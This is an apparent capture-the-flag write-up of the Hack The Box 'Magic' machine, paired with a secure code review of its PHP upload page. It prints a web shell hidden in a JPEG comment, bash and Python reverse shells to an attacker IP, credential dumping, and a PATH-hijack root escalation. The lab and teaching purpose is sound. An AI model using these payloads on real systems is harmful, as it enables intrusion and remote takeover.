# Magic Writeup w/o Metasploit

![Image for post](https://miro.medium.com/max/594/1*j2Q42VFXL2vn_RM5kNrovA.png)

When working on the initial foothold of this box, I found it to be very similar to an exercise I worked on in the OSWE labs and therefore, made the decision to solve this box in a slightly different way.

The blog will be divided into three sections:

* **Box Walkthrough:** _****_This section provides a walkthrough of how to solve the box.
* **Automated Script\(s\):** This section automates the web application attack vector\(s\) of the box. This is in an effort to improve my scripting skills for the OSWE certification.
* **Code Review:** This section dives into the web application code to find out what portion\(s\) of the insecure code introduced the vulnerabilities. Again, this is in an effort to improve my code review skills for the OSWE certification.

## Box Walkthrough <a id="3395"></a>

This section provides a walkthrough of how to solve the box.

### Reconnaissance <a id="65a8"></a>

Run [AutoRecon](https://github.com/Tib3rius/AutoRecon) to enumerate open ports and services running on those ports.

```text
autorecon.py 10.10.10.185
```

View the full TCP port scan results.

```text
root@kali:~/# cat _full_tcp_nmap.txt 
...
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
... 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))                   
| http-methods:                                                                      
|_  Supported Methods: GET HEAD POST OPTIONS                                         
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 
....
```

We have two ports open.

* **Port 22:** running OpenSSH 7.6p1
* **Port 80:** running Apache httpd 2.4.29

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 80 is running a web server. AutoRecon by default runs gobuster and nikto scans on HTTP ports, so we’ll have to review them. Since this is the only other port that is open, it is very likely to be our initial foothold vector.

### Enumeration <a id="fe35"></a>

Visit the application in the browser.

![Image for post](https://miro.medium.com/max/914/1*Pj5AuiuvSXALBDfRDcpnUA.png)

Viewing the page source doesn’t give us any useful information. Next, view Autorecon’s gobuster scan.

```text
root@kali:~/# cat tcp_80_http_gobuster.txt | grep -v 403
/assets (Status: 301) [Size: 313]
/images (Status: 301) [Size: 313]
/index.php (Status: 200) [Size: 5069]
/index.php (Status: 200) [Size: 5067]
/login.php (Status: 200) [Size: 4221]
/logout.php (Status: 302) [Size: 0]
/upload.php (Status: 302) [Size: 2957]
```

Right off the bat, I see something that could potentially be very concerning. The _upload.php_ & _logout.php_ pages are internal pages \(require authentication\) that lead to a 302 redirect when a user attempts to access them. However, the interesting part is the response size. The _upload.php_ response size is much larger than what a normal 302 redirect response would be. So if I had to guess, the PHP script is not properly terminated after user redirection, which could give us unrestricted access to any internal page in the application.

We can confirm this using Burp proxy. Visit the _upload.php_ script and intercept the traffic in Burp. As can be seen in the below image, before the request is redirected to the login page, we are served with the upload page.

![Image for post](https://miro.medium.com/max/1190/1*MkxcNYDWbsJIBR_Y0KbCIw.png)

Now all we have to do is change the HTTP Status Code from “_302 Found_” to “_200 OK_” and we get access to the upload page. To have Burp automatically do that for you, visit the _Proxy_ &gt; _Options_ tab. In the _Match and Replace_ section, set the following options.

![Image for post](https://miro.medium.com/max/764/1*0SYDqCLN6oZGVVRyEqGIbg.png)

Now visiting the _upload.php_ page in the browser does not redirect to the _login.php_ page.

![Image for post](https://miro.medium.com/max/905/1*H50u6PpY-PgxLH7Jye-ERQ.png)

An improperly implemented upload functionality could potentially give us code execution on the box. However, that would require two conditions:

1. Being able to upload a shell on the box
2. Being able to call and execute that shell

Even if I could upload PHP code, it’s not much use if I can’t call it. So let’s upload a JEPG image and see if we can call it through the web server.

![Image for post](https://miro.medium.com/max/439/1*fQkl3nMEdYZFtGldZuq1yA.png)

We get a file has been uploaded message. Visiting the root directory, we see that our image is included in the slide show.

![Image for post](https://miro.medium.com/max/1188/1*YowvW6AK8RunmXo6Hdmu2A.png)

Viewing the page source gives us the path to the image.

![Image for post](https://miro.medium.com/max/577/1*Qiokb885rKy-YnTEUjLsFw.png)

Good. So we do have a way to call the image. Now all we need to do is figure out a way to bypass file upload restrictions to upload PHP code.

### Initial Foothold <a id="1894"></a>

Try and upload a file with a “_.php_” extension.

![Image for post](https://miro.medium.com/max/383/1*mLTSoAhoR7wKrQcilk7iEw.png)

We get the above message indicating that there are backend restrictions on the file extension. Next, try and upload a file with the extension “_.php.jpeg_”.

![Image for post](https://miro.medium.com/max/292/1*fpjf6ryaqMXRnPd4vKdUvQ.png)

We get a different error message. So we bypassed the extension restriction, but we’re now faced with another restriction. My guess is it is checking the mime type of the file. To bypass that, we’ll use exiftool to add PHP code to our cat image.

```text
exiftool -Comment='<?php system($_GET['cmd']); ?>' cat.jpeg
```

This adds a parameter to the GET request called _cmd_ that we’ll use to get code execution. View the type of the file.

```text
root@kali:~# file cat.php.jpeg 
cat.php.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system(['cmd']); ?>", baseline, precision 8, 121x133, components 3
```

The file is still a JPEG image, so it should bypass MIME type restrictions. Upload the file.

![Image for post](https://miro.medium.com/max/458/1*6opCjWPpvwzECZlO_jtevA.png)

Perfect! Now call the file with the cmd parameter to confirm that we have code execution.

![Image for post](https://miro.medium.com/max/716/1*RwSnu0EU86R0a3ZbEvt-Xw.png)

We have code execution! Now, let’s get a reverse shell. First, set up a listener on the attack machine.

```text
nc -nlvp 443
```

Then run the request again and send it to _Repeater._ Next, visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and add the bash reverse shell in the ‘_cmd_’ parameter.

```text
bash -c 'bash -i >& /dev/tcp/10.10.14.171/443 0>&1'
```

Make sure to URL encode it before you send the request \(Ctrl + U\).

![Image for post](https://miro.medium.com/max/659/1*NPkw2rnthUK6a2_-MY1NJw.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “_fg_” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _www-data_ and we don’t have privileges to view the _user.txt_ flag. Therefore, we need to escalate our privileges.

### Privilege Escalation <a id="a004"></a>

Going through the web app files, we find database credentials in the _db.php5_ file.

```text
www-data@ubuntu:/var/www/Magic$ cat db.php5
...
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
...
```

Let’s check if _theseus_ is a user on the system.

```text
www-data@ubuntu:/var/www/Magic$ cat /etc/passwd
...
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
...
```

He is. Let’s see if he reused his database credentials for his system account.

```text
www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
su: Authentication failure
```

Doesn’t work. The next thing to try is logging into the database with the credentials we found.

![Image for post](https://miro.medium.com/max/458/1*Ox4w5IsepoJU-Fx5IazDqg.png)

We can see that _mysqldump_ is installed on the box, which we’ll use to dump the database.

```text
www-data@ubuntu:/usr/bin$ mysqldump --databases Magic -utheseus -piamkingtheseus
...
--
-- Dumping data for table `login`
--LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
...
```

Try the credentials we found on the _theseus_ account.

```text
www-data@ubuntu:/usr/bin$ su theseus   
Password: 
theseus@ubuntu:/usr/bin$
```

We’re in! View the _user.txt_ flag.

![Image for post](https://miro.medium.com/max/453/1*zpXdp_gjkARNlAXoXqUjqg.png)

Now we need to escalate our privileges to root. I downloaded the _LinEnum_ script and ran it. It looks like the SUID bit is set for the _sysinfo_ program, which means that the program runs with the privileges of the owner of the file.

```text
/bin/sysinfo
```

Let’s run _strings_ on the program to see what it’s doing.

```text
theseus@ubuntu:/usr/include/x86_64-linux-gnu/sys$ strings /bin/sysinfo
...
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
...
```

We can see that it runs the _fdisk_ & _lshw_ programs without specifying the full path. Therefore, we could abuse that to our advantage and have it instead run a malicious _fdisk_ program that we control.

In the _tmp_ folder \(which we have write access to\), create an _fdisk_ file and add a python reverse shell to it.

```text
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.171",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Give it execute rights.

```text
chmod +x fdisk
```

Set the path directory to include the _tmp_ directory.

```text
PATH=/tmp:$PATH
```

This way when we run the _sysinfo_ program, it’ll look for the _fdisk_ program in the _tmp_ directory and execute our reverse shell.

Setup a netcat listener to receive the reverse shell.

```text
nc -nlvp 7777
```

Then run the _sysinfo_ command.

```text
sysinfo
```

We get a shell!

![Image for post](https://miro.medium.com/max/528/1*4lzS3H0nT6FXgcl21HGWDQ.png)

Upgrade the shell and get the _root.txt_ flag

![Image for post](https://miro.medium.com/max/414/1*x4HvgMZr8D1EzkwWzatvvw.png)

## Automated Scripts <a id="1d63"></a>

This section automates the web application attack vector\(s\) of the box. I’ve written the code in such a way that it should be easily read, therefore, I won’t go into explaining it here.

The script automates the initial foothold vector for this box and can be found on my [GitHub page](https://github.com/rkhal101/Hack-the-Box-OSWE-Preparation/blob/master/linux-boxes/magic/htb-magic-exploit.py). Refer to the _Usage Instructions_ in the main method for instructions on how to run the script.

![Image for post](https://miro.medium.com/max/1382/1*U0Fns-gUfvopfZlNaPqELQ.png)

## Secure Code Review <a id="7cb9"></a>

This section dives into the code to find out what portion\(s\) of the code introduced the vulnerabilities.

### Setup <a id="7369"></a>

Zip the _www_ directory.

```text
zip -r www.zip www/
```

Start a python server on the target machine.

```text
python3 -m http.server
```

Download the zipped file on the target machine.

```text
wget http://10.10.10.185:8000/www.zip
```

Unzip the file.

```text
unzip www.zip 
```

**Note:** I have uploaded the [code on GitHub](https://github.com/rkhal101/Hack-the-Box-OSWE-Preparation/tree/master/linux-boxes/magic/source-code).

### Code Review <a id="bc0c"></a>

We observed two vulnerabilities while testing the web application.

1. Improper redirection
2. Insecure file upload functionality.

Both vulnerabilities were discovered in the _upload.php_ page, so we’ll start with that page.

**Vuln \#1: Improper Redirection**

Lines 2–6 of the _upload.php_ script handle the redirection functionality.

![Image for post](https://miro.medium.com/max/580/1*LhT2qQpbruKWlq_A3hF22A.png)

The following is an overview of the code:

* **Line 2:** Calls the [_session\_start_](https://www.php.net/manual/en/function.session-start.php#:~:text=session_start%28%29%20creates%20a%20session,and%20read%20session%20save%20handlers.) function which creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.
* **Lines 4–6:** Call the [_isset_](https://www.php.net/manual/en/function.isset.php) function to check whether the user is logged in or not. This is done by checking if the user\_id index of the global $\_SESSION variable evaluating to anything other than null. If the user is not logged in, the [_header_](https://www.php.net/manual/en/function.header.php) function gets called which redirects the user to the login page.

Before we dive into why this code is vulnerable, it’s worth looking at how sessions are created on the server-side.

Sessions are saved in the following folder on the system. In the below image, the first session \(_sess\_6aen…_\) was created by logging into the application using a valid username/password. Therefore, the size of the image is larger than zero b/c it contains session information. Whereas, the second session \(_sess\_tkas..._\) was created by navigating to the _upload.php_ script w/o logging in. Therefore, although the session got created, it does not contain any information.

![Image for post](https://miro.medium.com/max/695/1*QQEyRrl5O0TUgFoxBx8-nA.png)

Viewing the content of the first session we see the user id is associated to a value and therefore when the _isset_ function is called, it evaluates to true which skips the redirection to the login page.

```text
root@ubuntu:/var/lib/php/sessions# cat sess_6aengltqst8pck0jccrlkgmb8h user_id|s:1:"1";
```

Why is this code vulnerable? Notice that when a user does not have a valid session id, the user is redirected but any code after line \#6 is still rendered in the HTTP response before the redirect. That’s why when we stopped the redirection in the proxy, we were able to see the upload functionality.

To make this really clear, we can write a small [PHP script](https://github.com/rkhal101/Hack-the-Box-OSWE-Preparation/tree/master/linux-boxes/magic/examples) that redirects to another page if a session is not valid.

```text
root@kali:~/Desktop/temp# cat page1.php 
<?php
// page1.php
session_start();                                                                  if (!isset($_SESSION['user_id'])) {                                                  
    header("Location: page2.php");                                                   
}                                                                                                                                                                                                                                                           
echo 'Welcome to page #1';
?>root@kali:~/Desktop/temp# cat page2.php 
<?php
// page2.php
session_start();
echo 'Welcome to page #2';
?>
```

To test the code, setup a PHP server.

```text
php -S 127.0.0.1:8888
```

Then visit page 1 in the browser. This automatically redirects you to page 2.

![Image for post](https://miro.medium.com/max/466/1*Gs3ZKV_PPPBtjrqoZ_FRLQ.png)

However, if we see the request in the proxy, we can see that before it redirects the user, the code in page 1 is rendered.

![Image for post](https://miro.medium.com/max/1286/1*gSDYjPO0XVJCUsk7ZFPLgw.png)

The way to fix this vulnerability is simply to add the _die\(\)_ or _exit\(\)_ functions after the _Location_ header. This makes sure that the code below the function does not get executed when redirected.

Therefore, to fix the vulnerability, make the following change to _page1.php_.

```text
root@kali:~/Desktop/temp# cat page1-fix.php 
<?php
// page1.php
session_start();
if (!isset($_SESSION['user_id'])) {
        header("Location: page2.php");
        exit();
}
echo 'Welcome to page #1';
?>
```

Now when you visit page 1 in the browser, you automatically get redirected to page 2 but anything after the exit function is no longer rendered.

![Image for post](https://miro.medium.com/max/1263/1*8A4jCyQV7vdg9t3ittUAUg.png)

**Vuln \#2: Insecure File Upload Functionality**

Lines 7–44 describe the upload functionality. We can see that there are two validation checks that are being performed, the first one checks the file format and the second checks the file type using magic bytes.

![Image for post](https://miro.medium.com/max/791/1*0KAkNGmCuV_UAO7WIexd6A.png)

Let’s dive into the first validation check. Lines 14–19 verify if the file format is anything other than JPG, PNG & JPEG.

![Image for post](https://miro.medium.com/max/774/1*0kF07b1V8rIrZk9_U1OyNA.png)

The following is an overview of the code:

* **Line 15:** Calls ****the [_pathinfo_](https://www.php.net/manual/en/function.pathinfo.php) function which takes in the uploaded file and uses the option _PATHINFO\_EXTENSION_ to strip out the extension of the file and save it in the variable _imageFileType_. The thing to note about this option is that if the file has more than one extension, it strips the last one.
* **Lines 16–18:** Checks if the file extension is one of the three: _jpg_, _png_ & _jpeg_. If not, it outputs an alert and the file upload fails.

How can we bypass this validation check? Since the _PATHINFO\_EXTENSION_ option only strips out the last extension, if the file has more than one extension, we could simply name the file “_test.php.png_”. When the filename passes through this validation check, it outputs that the file extension is _png._

The next validation check being performed is on Lines 21–28 which verifies that the image is actually a png or jepg using magic bytes.

![Image for post](https://miro.medium.com/max/726/1*N-mziY36uj81qO0C3Q9K8A.png)

The following is an overview of the code:

* **Line 23:** Calls the [_exif\_imagetype_](https://www.php.net/manual/en/function.exif-imagetype.php) function which takes in the uploaded file and reads the first bytes of an image and checks its signature. When a correct signature is found, the appropriate constant value will be returned \(1 for GIF, 2 for JPEG, 3 for PNG, etc.\), otherwise the return value is False.
* **Lines 23–27:** Use the _in\_array_ function to see if the constant value outputted from the _exif\_imagetype_ function exists in the array of the allowed values which was initialized at the beginning of the script to 2 & 3. Therefore, this validation check only accepts signatures for JPEG and PNG images.

How can we bypass this validation check? Since the _exif\_imagetype_ function only reads the first bytes of the image to check the signature, we can simply add a malicious script to an existing JPEG or PNG file like we did with exiftool.

The remaining lines of the code upload the file in the directory _images/uploads_ if the file passed the above two validation checks.

![Image for post](https://miro.medium.com/max/775/1*ucpWOmHnSPRfdjy90_-9ew.png)

How do you fix this vulnerability? Ideally you would use a third party service that offers enterprise security with features such as antivirus scanning to manage the file upload system. However, if that option is not possible, the [OWASP guide](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) has a list of prevention methods to secure file uploads. These include but are not limited to, the use a virus scanner on the server, consider saving the files in a database instead of a filesystem, or if a filesystem is necessary, then on an isolated server and ensuring that the upload directory does not have any execute permissions.

